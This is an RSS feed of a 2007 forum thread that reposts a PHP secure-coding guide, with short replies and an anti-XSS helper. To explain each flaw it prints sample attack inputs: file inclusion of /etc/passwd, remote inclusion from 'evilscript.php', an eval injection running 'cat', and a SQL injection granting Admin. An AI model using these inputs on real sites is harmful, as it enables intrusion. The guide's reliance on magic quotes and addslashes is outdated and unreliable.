<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[PHP] Must read Security Notes</title>
    <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592</link>
    <description>The purpose of this document is to inform PHP programmers of common security mistakes that can be overlooked in PHP scripts. While many of the following concepts may appear to be common sense, they are unfortunately not always common practice. After applying the following practices to your coding, you will be able to eliminate the vast majority of security holes that plague many scripts. Many of these security holes have been found in widely-used open source and commercial PHP scripts in the past.

The most important concept to learn from this article is that you should never trust the user to input exactly what is expected. The way most PHP scripts are compromised is by entering unexpected data to exploit security holes inadvertantly left in the script.

Always keep the following principles in mind when designing your scripts:

[b]1. Never include, require, or otherwise open a file with a filename based on user input, without thoroughly checking it first.[/b]

Take the following example:

[php]
if(isset($page)) 
{ 
  include($page); 
}
[/php]

Since there is no validation being done on $page, a malicious user could hypothetically call your script like this (assuming register_globals is set to ON):

script.php?page=/etc/passwd

Therefore causing your script to include the servers /etc/passwd file. When a non PHP file is include()&#39;d or require()&#39;d, it&#39;s displayed as HTML/Text, not parsed as PHP code.

On many PHP installations, the include() and require() functions can include remote files. If the malicious user were to call your script like this:

script.php?page=http://mysite.com/evilscript.php

He would be able to have evilscript.php output any PHP code that he or she wanted your
script to execute. Imagine if the user sent code to delete content from your database or
even send sensitive information directly to the browser.

Solution: validate the input. One method of validation would be to create a list of acceptable pages. if the input did not match any of those pages, an error could be displayed. 

[php]
$pages = array(&#39;index.html&#39;, &#39;page2.html&#39;, &#39;page3.html&#39;); 
if( in_array($page, $pages) ) 
{ 
    include($page); 
{ 
else 
{ 
   die(&quot;Nice Try.&quot;); 
} 
[/php]

[b]2. Be careful with eval()[/b]

Placing user-inputted values into the eval() function can be extremely dangerous. You essentially give the malicious user the ability to execute any command he or she wishes! You may envision the input coming from a drop-down menu of options you specify, but you user may decide to send input like this:

script.php?input=;passthru(&quot;cat /etc/paswd&quot;);

By putting his own code in that statement the user could cause your program to output your 
server&#39;s complete /etc/passwd file.

Use eval() sparingly, and by all means, validate the input. It should only be used when absolutely necessary - when there is dynamically generated PHP code. If you are using it to substitute template variables into a string or substitute user-inputted values - you are using it for the wrong reason. Try sprintf() or a template system instead.

[b]3. Be careful when using register_globals = ON[/b]
This has been a major issue since this feature was invented. It was originally designed to make programming in PHP easier (and that it did), but misuse of it often led to security holes. As of PHP 4.2.0, register_globals is set to OFF by default. It is recommended that
you use the superglobals to deal with input( $_GET, $_POST, $_COOKIE, $_SESSION, etc).

For example, let us say that you had a variable that specified what page to include:

[php]
include($page); 
[/php]

But you intended $page to be defined in a config file or somewhere else in the script, and not to come as user input. In one instance you forgot to pre-define $page. If register_globals is set to on, the malicious user can take over and define $page for you, by calling your script like this:

script.php?page=http://www.example.com/evilscript.php

I recommend that you develop with register_globals set to OFF, and use the superglobals when accessing user input. In addition, you should always develop with full error reporting, which can be specified like this (at the top of your script):

[php]
error_reporting(E_ALL); 
[/php]

This way, you will receive a notice for every variable you try to call that was not previously defined. Yes, PHP does not requre you to define variables so there may be notices that you can ignore, but this will help you to catch undefined variables that you did expect to come from input or other sources. In the previous example, when $page was referenced in the include() statement, PHP would issue a notice that $page was not defined.

Whether or not you want to use register_globals is up to you, but make sure you are aware of the advantages and disadvantages of it and how to remedy the possible security holes.

[b]4. Never run unescaped queries[/b]
PHP has a feature, enabled by default, that automatically escapes (adds a backslash in front of) certain characters that come in from a GET, POST, or COOKIE. The &quot;single quote&quot; is one example of a character that is escaped automatically. This is done so that if you include input variables in your SQL queries, it will not treat single quotes as part of the query. Say your user entered $name from a form and you performed this query:

UPDATE users SET Name=&#39;$name&#39; WHERE ID=1;

Normally, if they had entered $name with single quotes in them, they would be escaped, so MySQL would see this:

UPDATE users SET Name=&#39;Joe\&#39;s&#39; WHERE ID=1

So that the single quote entered into &quot;Joe&#39;s&quot; would not interfere with the query syntax.

In some situations, you may use stripslashes() on an input variable. If you put the variable into a query, make sure to use addslashes() or mysql_escape_string()to escape the single quotes before your run the query. Imagine if an unslashed query went in, and a malicious user had entered part of a query as their name!

UPDATE users SET Name=&#39;Joe&#39;,Admin=&#39;1&#39; WHERE ID=1

On the input form, the user would have entered:
Joe&#39;,Admin=&#39;1

As their name, and since the single quotes were not escaped, he or she would be able to actually end the name definition, place in a comma, and set another variable called Admin!

The final query with input in blue would look like this:

UPDATE users SET Name=&#39;Joe&#39;,Admin=&#39;1&#39; WHERE ID=1

In some configurations, magic_quotes_gpc (the feature that automatically adds slashes to all input) is actually set to OFF. You can use the function get_magic_quotes_gpc() to see if it&#39;s on or not (it returns true or false). If it returns false, simply use addslashes() to add slashes to all of the input (it is easiest if you use $_POST, $_GET, and $_COOKIE or $HTTP_POST_VARS, $HTTP_GET_VARS, and $HTTP_COOKIE_VARS, instead of globals because you could step through those arrays using a foreach() loop and add slashes to each one).

[b]5. For protected areas, use sessions or validate the login every time[/b]
There are some cases where programmers will only use some sort of login.php script to first validate their username and password (entered through a form), test if they&#39;re an administrative or valid user, and actually set a variable through a cookie, or even hide it as a hidden variable. Then in the code, they check to see if they have access like this:

[php]
if($admin) 
{ 
   // let them in 
} 
else 
{ 
   // kick them out 
} 
[/php]

The above a code makes the fatal assumption that the $admin variable can only come from a cookie or input form that the malicious user has no control over. However, that is simply not the case. With register_globals enabled, injecting designed input into the $admin variable is as easy as calling the script like so:

script.php?admin=1

Furthermore, even if you use the superglobals $_COOKIE or $_POST, a malicious user can easily forge a cookie or create his own HTML form to post any information to your script.

There are two good solutions to this problem. One is on the same track as setting an $admin variable, but this time set $admin as a session variable. In this case, it is stored on the server and is much less likely to be forged. On subsequent calls to the same script, your user&#39;s previous session information will be available on the server, and you will be able to verify if the user is an administrator like so:

if( $_SESSION[&#39;admin&#39;] )

The second solution is to only store their username and password in a cookie, and with every call to the script, validate the username and password and verify if the user is an administrator. You could have 2 functions - one called validate_login($username,$password) that verified the user&#39;s login information, and one called is_admin($username) that queried the database to see if that username is an administrator. The code would be placed at the top of any protected script:

[php]
if( !validate_login( $_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;] ) ) 
{ 
  echo &quot;Sorry, invalid login&quot;; 
  exit; 
} 

// the login is ok if we made it down here 
if( !is_admin( $_COOKIE[&#39;username&#39;] ) ) 
{ 
   echo &quot;Sorry, you do not have access to this section&quot;; 
   exit; 
} 
[/php]

Personally I recommend using sessions, as the latter solution is not scalable.[br][size=1]Posted on: February 14, 2007, 07:45:01 PM[/size][hr][b]6. If you don&#39;t want the file contents to be seen, give the file a .php extension[/b]
It was common prattice for awhile to name include files or library files with a .inc extension. Here&#39;s the problem: if a malicious user simply enters the .inc file into his browser, it will be displayed as plain text, not parsed as PHP. Even if the browser did not like the file type, an option to download it would most likely be given. Imagine if this file had your database login and password, or even more sensitive information. 

This goes for any other extension other than .php (and a few others), so even a .conf or a .cfg file would not be safe.

The solution is to put a .php extension on the end of it. Since your include files or config files usually just define variables and/or functions and not really output anything, if your user were to load this, for example, into their browser:

[url=http://yoursite.com/lib.inc.php]http://yoursite.com/lib.inc.php[/url]

They would most likely be shown nothing at all, unless of your lib.inc.php outputs something. Either way, the file would be parsed as PHP instead of just displaying your code.

There are also some reports of people adding Apache directives that will deny access to .inc files, however I do not recommend this, because of the lack of portability. If you rely on .inc files and that Apache directive to deny access to them and one day you move your scripts to another server and forget to place the Apache directive in, you are wide open.</description>
    
    <lastBuildDate>Thu, 08 Mar 2007 05:21:41 +0000</lastBuildDate>
    <category>General Programming</category>
    <atom:link href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@Cabby Cabby]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/cabby">@Cabby</a> wrote:</p>
          <blockquote>
              <p>93dcthugs93, You continue to amaze me! Keep up the good work <img src="https://forum.moparisthebest.com/images/emoji/twitter/slight_smile.png?v=6" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/12">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/12</link>
        <pubDate>Thu, 08 Mar 2007 05:21:41 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-12</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@93dcthugs93 93dcthugs93]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/93dcthugs93">@93dcthugs93</a> wrote:</p>
          <blockquote>
              <p>Thanks for the add (H)</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/11">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/11</link>
        <pubDate>Thu, 08 Mar 2007 05:15:45 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-11</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@sppt sppt]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/sppt">@sppt</a> wrote:</p>
          <blockquote>
              <p>basic stuff, but should ALWAYS be noticed <img src="https://forum.moparisthebest.com/images/emoji/twitter/slight_smile.png?v=6" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>also, use this snippet to filter out most XSS(not completly mine, it’s from net-force.nl)<br>
[php]function noXSS($input) {<br>
# add slashes if PHP didn’t do it<br>
if (!get_magic_quotes_gpc($input))<br>
$input = mysql_real_escape_string($input);<br>
# replace: javascript, ’<br>
$input = str_replace(array(<br>
‘javascript’,<br>
‘"’<br>
), array(<br>
‘java script’,<br>
‘’’)<br>
, $input);<br>
# replace: ", &lt;, &gt;, &amp;<br>
return htmlspecialchars($input);<br>
}[/php]</p>
<p>and some other escaping functions:<br>
[php]function escape_gpc($str) {<br>
if(!get_magic_quotes_gpc()) {<br>
return mysql_real_escape_string($str);<br>
}<br>
return $str;<br>
}</p>
<p>function escapeHtml($str, $mode=2) {<br>
if($str &amp;&amp; $mode) {<br>
if($mode == 1) {<br>
return htmlentities($str);<br>
}<br>
elseif($mode == 2) {<br>
return strip_tags(htmlentities($str));<br>
}<br>
elseif($mode == 3) {<br>
return strip_tags($str);<br>
}<br>
elseif($mode == 4) {<br>
return htmlspecialchars($str, ENT_QUOTES, “UTF-8”);<br>
}<br>
else {<br>
return $str;<br>
}<br>
}<br>
return $str;<br>
}[/php]</p>
<p>edit: as for including pages: i usually use a system like this:<br>
[php]$menuArray = array(“index”, “search”);<br>
$page = (in_array($_GET[‘p’], $menuArray)) ? $_GET[‘p’] : “index”;</p>
<p>if($page == “index”) {<br>
echo “index”;<br>
}<br>
elseif($page == “search”) {<br>
echo “search”;<br>
}<br>
//etc…<br>
else {<br>
//error?</p>
<p>}[/php]</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/10">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/10</link>
        <pubDate>Sat, 17 Feb 2007 06:17:04 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-10</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@xxlegitxx xxlegitxx]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/xxlegitxx">@xxlegitxx</a> wrote:</p>
          <blockquote>
              <p>This is really nice.  I was always wondering if my system was flawed, and looking at this, its good.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/9</link>
        <pubDate>Fri, 16 Feb 2007 14:17:48 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-9</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@93dcthugs93 93dcthugs93]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/93dcthugs93">@93dcthugs93</a> wrote:</p>
          <blockquote>
              <p>I did it up a little bit &amp; links are boring, thats why. I also helped write 98% of it so I have rights <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=6" title=":wink:" class="emoji" alt=":wink:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/8</link>
        <pubDate>Thu, 15 Feb 2007 16:25:09 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-8</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@juju juju]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/juju">@juju</a> wrote:</p>
          <blockquote>
              <p>Why not just link us to the source instead of pasting it all?<br>
<aside class="onebox whitelistedgeneric">
  <header class="source">
      <a href="http://www.devshed.com/c/a/PHP/PHP-Security-Mistakes/" target="_blank" title="12:00AM - 09 June 2004" rel="nofollow noopener">devshed – 9 Jun 04</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="http://www.devshed.com/c/a/PHP/PHP-Security-Mistakes/" target="_blank" rel="nofollow noopener">PHP Security Mistakes - devshed</a></h3>

<p>The purpose of this document is to inform PHP programmers of common security mistakes that can be overlooked in PHP scripts. While many of the following concepts may appear to be common sense, they are unfortunately not always common practice. After...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/7</link>
        <pubDate>Thu, 15 Feb 2007 13:29:31 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-7</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@The_Un-Named The Un-Named]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/the_un-named">@The_Un-Named</a> wrote:</p>
          <blockquote>
              <p>Very nice again!</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/6</link>
        <pubDate>Thu, 15 Feb 2007 10:36:06 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-6</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@93dcthugs93 93dcthugs93]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/93dcthugs93">@93dcthugs93</a> wrote:</p>
          <blockquote>
              <p>Just put up some PHP FAQ 8) Check it out.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/5</link>
        <pubDate>Thu, 15 Feb 2007 07:24:06 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-5</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@ilyaostr9 io9]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ilyaostr9">@ilyaostr9</a> wrote:</p>
          <blockquote>
              <p>This totally helped me.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/4</link>
        <pubDate>Thu, 15 Feb 2007 06:56:01 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-4</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@93dcthugs93 93dcthugs93]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/93dcthugs93">@93dcthugs93</a> wrote:</p>
          <blockquote>
              <p>Thanks, Real <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=6" title=":wink:" class="emoji" alt=":wink:"></p>
<p>oh by the way…</p>
<p>www.epenis.eu</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/3</link>
        <pubDate>Thu, 15 Feb 2007 06:51:55 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-3</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@therealjdb JDB`]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/therealjdb">@therealjdb</a> wrote:</p>
          <blockquote>
              <p>Wow nice, I’d ++ you if I had 2 more ePenis <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=6" title=":wink:" class="emoji" alt=":wink:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/2</link>
        <pubDate>Thu, 15 Feb 2007 06:48:56 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-2</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
      <item>
        <title>[PHP] Must read Security Notes</title>
        <dc:creator><![CDATA[@93dcthugs93 93dcthugs93]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/93dcthugs93">@93dcthugs93</a> wrote:</p>
          <blockquote>
              <p>The purpose of this document is to inform PHP programmers of common security mistakes that can be overlooked in PHP scripts. While many of the following concepts may appear to be common sense, they are unfortunately not always common practice. After applying the following practices to your coding, you will be able to eliminate the vast majority of security holes that plague many scripts. Many of these security holes have been found in widely-used open source and commercial PHP scripts in the past.</p>
<p>The most important concept to learn from this article is that you should never trust the user to input exactly what is expected. The way most PHP scripts are compromised is by entering unexpected data to exploit security holes inadvertantly left in the script.</p>
<p>Always keep the following principles in mind when designing your scripts:</p>
<p><span class="bbcode-b">1. Never include, require, or otherwise open a file with a filename based on user input, without thoroughly checking it first.</span></p>
<p>Take the following example:</p>
<p>[php]<br>
if(isset($page))<br>
{<br>
include($page);<br>
}<br>
[/php]</p>
<p>Since there is no validation being done on $page, a malicious user could hypothetically call your script like this (assuming register_globals is set to ON):</p>
<p>script.php?page=/etc/passwd</p>
<p>Therefore causing your script to include the servers /etc/passwd file. When a non PHP file is include()'d or require()'d, it’s displayed as HTML/Text, not parsed as PHP code.</p>
<p>On many PHP installations, the include() and require() functions can include remote files. If the malicious user were to call your script like this:</p>
<p>script.php?page=http://mysite.com/evilscript.php</p>
<p>He would be able to have evilscript.php output any PHP code that he or she wanted your<br>
script to execute. Imagine if the user sent code to delete content from your database or<br>
even send sensitive information directly to the browser.</p>
<p>Solution: validate the input. One method of validation would be to create a list of acceptable pages. if the input did not match any of those pages, an error could be displayed.</p>
<p>[php]<br>
$pages = array(‘index.html’, ‘page2.html’, ‘page3.html’);<br>
if( in_array($page, $pages) )<br>
{<br>
include($page);<br>
{<br>
else<br>
{<br>
die(“Nice Try.”);<br>
}<br>
[/php]</p>
<p><span class="bbcode-b">2. Be careful with eval()</span></p>
<p>Placing user-inputted values into the eval() function can be extremely dangerous. You essentially give the malicious user the ability to execute any command he or she wishes! You may envision the input coming from a drop-down menu of options you specify, but you user may decide to send input like this:</p>
<p>script.php?input=;passthru(“cat /etc/paswd”);</p>
<p>By putting his own code in that statement the user could cause your program to output your<br>
server’s complete /etc/passwd file.</p>
<p>Use eval() sparingly, and by all means, validate the input. It should only be used when absolutely necessary - when there is dynamically generated PHP code. If you are using it to substitute template variables into a string or substitute user-inputted values - you are using it for the wrong reason. Try sprintf() or a template system instead.</p>
<p><span class="bbcode-b">3. Be careful when using register_globals = ON</span><br>
This has been a major issue since this feature was invented. It was originally designed to make programming in PHP easier (and that it did), but misuse of it often led to security holes. As of PHP 4.2.0, register_globals is set to OFF by default. It is recommended that<br>
you use the superglobals to deal with input( $_GET, $_POST, $_COOKIE, $_SESSION, etc).</p>
<p>For example, let us say that you had a variable that specified what page to include:</p>
<p>[php]<br>
include($page);<br>
[/php]</p>
<p>But you intended $page to be defined in a config file or somewhere else in the script, and not to come as user input. In one instance you forgot to pre-define $page. If register_globals is set to on, the malicious user can take over and define $page for you, by calling your script like this:</p>
<p>script.php?page=http://www.example.com/evilscript.php</p>
<p>I recommend that you develop with register_globals set to OFF, and use the superglobals when accessing user input. In addition, you should always develop with full error reporting, which can be specified like this (at the top of your script):</p>
<p>[php]<br>
error_reporting(E_ALL);<br>
[/php]</p>
<p>This way, you will receive a notice for every variable you try to call that was not previously defined. Yes, PHP does not requre you to define variables so there may be notices that you can ignore, but this will help you to catch undefined variables that you did expect to come from input or other sources. In the previous example, when $page was referenced in the include() statement, PHP would issue a notice that $page was not defined.</p>
<p>Whether or not you want to use register_globals is up to you, but make sure you are aware of the advantages and disadvantages of it and how to remedy the possible security holes.</p>
<p><span class="bbcode-b">4. Never run unescaped queries</span><br>
PHP has a feature, enabled by default, that automatically escapes (adds a backslash in front of) certain characters that come in from a GET, POST, or COOKIE. The “single quote” is one example of a character that is escaped automatically. This is done so that if you include input variables in your SQL queries, it will not treat single quotes as part of the query. Say your user entered $name from a form and you performed this query:</p>
<p>UPDATE users SET Name=’$name’ WHERE ID=1;</p>
<p>Normally, if they had entered $name with single quotes in them, they would be escaped, so MySQL would see this:</p>
<p>UPDATE users SET Name=‘Joe’s’ WHERE ID=1</p>
<p>So that the single quote entered into “Joe’s” would not interfere with the query syntax.</p>
<p>In some situations, you may use stripslashes() on an input variable. If you put the variable into a query, make sure to use addslashes() or mysql_escape_string()to escape the single quotes before your run the query. Imagine if an unslashed query went in, and a malicious user had entered part of a query as their name!</p>
<p>UPDATE users SET Name=‘Joe’,Admin=‘1’ WHERE ID=1</p>
<p>On the input form, the user would have entered:<br>
Joe’,Admin='1</p>
<p>As their name, and since the single quotes were not escaped, he or she would be able to actually end the name definition, place in a comma, and set another variable called Admin!</p>
<p>The final query with input in blue would look like this:</p>
<p>UPDATE users SET Name=‘Joe’,Admin=‘1’ WHERE ID=1</p>
<p>In some configurations, magic_quotes_gpc (the feature that automatically adds slashes to all input) is actually set to OFF. You can use the function get_magic_quotes_gpc() to see if it’s on or not (it returns true or false). If it returns false, simply use addslashes() to add slashes to all of the input (it is easiest if you use $_POST, $_GET, and $_COOKIE or $HTTP_POST_VARS, $HTTP_GET_VARS, and $HTTP_COOKIE_VARS, instead of globals because you could step through those arrays using a foreach() loop and add slashes to each one).</p>
<p><span class="bbcode-b">5. For protected areas, use sessions or validate the login every time</span><br>
There are some cases where programmers will only use some sort of login.php script to first validate their username and password (entered through a form), test if they’re an administrative or valid user, and actually set a variable through a cookie, or even hide it as a hidden variable. Then in the code, they check to see if they have access like this:</p>
<p>[php]<br>
if($admin)<br>
{<br>
// let them in<br>
}<br>
else<br>
{<br>
// kick them out<br>
}<br>
[/php]</p>
<p>The above a code makes the fatal assumption that the $admin variable can only come from a cookie or input form that the malicious user has no control over. However, that is simply not the case. With register_globals enabled, injecting designed input into the $admin variable is as easy as calling the script like so:</p>
<p>script.php?admin=1</p>
<p>Furthermore, even if you use the superglobals $_COOKIE or $_POST, a malicious user can easily forge a cookie or create his own HTML form to post any information to your script.</p>
<p>There are two good solutions to this problem. One is on the same track as setting an $admin variable, but this time set $admin as a session variable. In this case, it is stored on the server and is much less likely to be forged. On subsequent calls to the same script, your user’s previous session information will be available on the server, and you will be able to verify if the user is an administrator like so:</p>
<p>if( $_SESSION[‘admin’] )</p>
<p>The second solution is to only store their username and password in a cookie, and with every call to the script, validate the username and password and verify if the user is an administrator. You could have 2 functions - one called validate_login($username,$password) that verified the user’s login information, and one called is_admin($username) that queried the database to see if that username is an administrator. The code would be placed at the top of any protected script:</p>
<p>[php]<br>
if( !validate_login( $_COOKIE[‘username’], $_COOKIE[‘password’] ) )<br>
{<br>
echo “Sorry, invalid login”;<br>
exit;<br>
}</p>
<p>// the login is ok if we made it down here<br>
if( !is_admin( $_COOKIE[‘username’] ) )<br>
{<br>
echo “Sorry, you do not have access to this section”;<br>
exit;<br>
}<br>
[/php]</p>
<p>Personally I recommend using sessions, as the latter solution is not scalable.[br][size=1]Posted on: February 14, 2007, 07:45:01 PM[/size][hr]<span class="bbcode-b">6. If you don’t want the file contents to be seen, give the file a .php extension</span><br>
It was common prattice for awhile to name include files or library files with a .inc extension. Here’s the problem: if a malicious user simply enters the .inc file into his browser, it will be displayed as plain text, not parsed as PHP. Even if the browser did not like the file type, an option to download it would most likely be given. Imagine if this file had your database login and password, or even more sensitive information.</p>
<p>This goes for any other extension other than .php (and a few others), so even a .conf or a .cfg file would not be safe.</p>
<p>The solution is to put a .php extension on the end of it. Since your include files or config files usually just define variables and/or functions and not really output anything, if your user were to load this, for example, into their browser:</p>
<p><a href="http://yoursite.com/lib.inc.php" data-bbcode="true" rel="nofollow noopener">http://yoursite.com/lib.inc.php</a></p>
<p>They would most likely be shown nothing at all, unless of your lib.inc.php outputs something. Either way, the file would be parsed as PHP instead of just displaying your code.</p>
<p>There are also some reports of people adding Apache directives that will deny access to .inc files, however I do not recommend this, because of the lack of portability. If you rely on .inc files and that Apache directive to deny access to them and one day you move your scripts to another server and forget to place the Apache directive in, you are wide open.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/php-must-read-security-notes/58592/1</link>
        <pubDate>Thu, 15 Feb 2007 06:46:20 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-58592-1</guid>
        <source url="https://forum.moparisthebest.com/t/php-must-read-security-notes/58592.rss">[PHP] Must read Security Notes</source>
      </item>
  </channel>
</rss>
